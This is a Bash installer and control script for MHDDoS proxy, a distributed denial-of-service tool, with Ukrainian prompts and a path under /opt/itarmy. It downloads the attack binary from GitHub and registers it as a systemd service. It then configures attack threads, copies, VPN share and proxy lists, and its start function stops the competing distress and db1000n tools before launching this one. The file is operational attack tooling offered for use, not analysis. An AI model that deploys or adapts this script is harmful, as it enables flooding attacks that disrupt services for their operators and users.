#!/bin/bash

install_mhddos() {

    sudo mkdir -p $WORKING_DIR

    cd $WORKING_DIR
    echo -e "${GREEN}Встановлюємо MHDDOS${NC}"
	
    OSARCH=$(uname -m)
    package=''
    case "$OSARCH" in
      aarch64*)
        package=https://github.com/porthole-ascend-cinnamon/mhddos_proxy_releases/releases/latest/download/mhddos_proxy_linux_arm64
      ;;

      x86_64*)
        package=https://github.com/porthole-ascend-cinnamon/mhddos_proxy_releases/releases/latest/download/mhddos_proxy_linux
      ;;

      i386* | i686*)
        echo "Відсутня реалізація MHDDOS для x86 архітектури, що відповідає 32-бітній розрядності";
        exit 1
      ;;

      *)
        echo "Неможливо визначити розрядность операційної системи";
        exit 1
      ;;
    esac

	  sudo curl -Lo mhddos_proxy_linux "$package"
    sudo chmod +x mhddos_proxy_linux
    regenerate_service_file
    sudo ln -sf  $SCRIPT_DIR/services/mhddos.service /etc/systemd/system/mhddos.service

    echo -e "${GREEN}MHDDOS успішно встановлено${NC}"
}

is_installed() {
  systemctl is-active --quiet mhddos
  echo $?
}

configure() {
    declare -A params;
    declare langs;

    read -p "Юзер ІД: " user_id

    if [[ -z "$user_id" ]]; then
      user_id=" "
    fi

    params[user-id]=$user_id
    read -p "Мова (ua | en | es | de | pl | it): " lang

    languages=("ua" "en" "es" "de" "pl" "it")
    while [[ ! "${languages[*]}" =~ "$lang" ]]
    do
      echo "Будь ласка введіть правильні значення"
      read -p "Мова (ua | en | es | de | pl | it): " lang
    done

    params[lang]=$lang

    read -p "Кількість копій (auto | X): " copies

    while ! [[ $copies =~ ^[0-9]+$ || "$copies" == "auto" ]]
    do
      echo "Будь ласка введіть правильні значення"
      read -p "Кількість копій (auto | X): " copies
    done

    params[copies]=$copies
    read -p "VPN (false | true): " vpn

     while ! [[ $vpn == false || $vpn == true ]]
      do
        echo "Будь ласка введіть правильні значення"
        read -p "VPN (false | true): " vpn
      done

    params[vpn]=$vpn

    if [[ $vpn == true ]]; then
      read -p "VPN percents (1-100): " vpn_percents

      while (( $vpn_percents < 1 || $vpn_percents > 100 ))
      do
        echo "Будь ласка введіть правильні значення"
        read -p "VPN percents (1-100): " vpn_percents
      done

      params[vpn-percents]=$vpn_percents
    else
      params[vpn-percents]=" "
    fi


    read -p "Threads: " threads

    while ! [[ $threads =~ ^[0-9]+$ ]]
    do
      echo "Будь ласка введіть правильні значення"
      read -p "Threads: " threads
    done

    params[threads]=$threads

    read -p "Проксі (шлях до файлу або веб-ресурсу): " proxies
    proxies=$(echo $proxies  | sed 's/\//\\\//g')

    if [[ -z "$proxies" ]]; then
      proxies=" "
    fi

    params[proxies]=$proxies

    for i in "${!params[@]}"; do
    	  value="${params[$i]}"

    	  if [[ -n "$value" ]]; then
    	    write_variable "$i" "$value"
    	  fi
    done
    regenerate_service_file
    echo -e "${GREEN}Успішно виконано${NC}"
}


regenerate_service_file() {
  lines=$(sed -n "/\[mhddos\]/,/\[\/mhddos\]/p" ${SCRIPT_DIR}/services/EnvironmentFile)

  start="ExecStart=/opt/itarmy/mhddos_proxy_linux"

  while read -r line
  do
    key=$(echo "$line"  | cut -d '=' -f1)
    value=$(echo "$line" | cut -d '=' -f2)

    if [[ "$key" = "[mhddos]" || "$key" = "[/mhddos]" ]]; then
      continue
    fi
    if [[ "$value" ]]; then
      start="$start --$key $value"
    fi
  done <<< "$lines"
  start=$(echo $start  | sed 's/\//\\\//g')

  sed -i  "s/ExecStart=.*/$start/g" ${SCRIPT_DIR}/services/mhddos.service

  sudo systemctl daemon-reload
}

get_variable() {
  lines=$(sed -n "/\[mhddos\]/,/\[\/mhddos\]/p" ${SCRIPT_DIR}/services/EnvironmentFile)
  variable=$(echo "$lines" | grep "$1=" | cut -d '=' -f2)
  echo "$variable"
}

write_variable() {
  sed -i "/\[mhddos\]/,/\[\/mhddos\]/s/$1=.*/$1=$2/g" ${SCRIPT_DIR}/services/EnvironmentFile
}

run() {
  sudo systemctl stop distress.service
  sudo systemctl stop db1000n.service
  sudo systemctl start mhddos.service
}

stop() {
  sudo systemctl stop mhddos.service
}

get_status() {
  sudo systemctl status mhddos.service
}
initiate() {

   menu=(
        "Запустити"
        "Зупинити"
        "Статус"
        )
  init "$menu"
  menu_result="$?"
  case "$menu_result" in
    0)
        run
        get_status
    ;;
    1)
        stop
        get_status
    ;;
    2)
        get_status
    ;;
  esac
}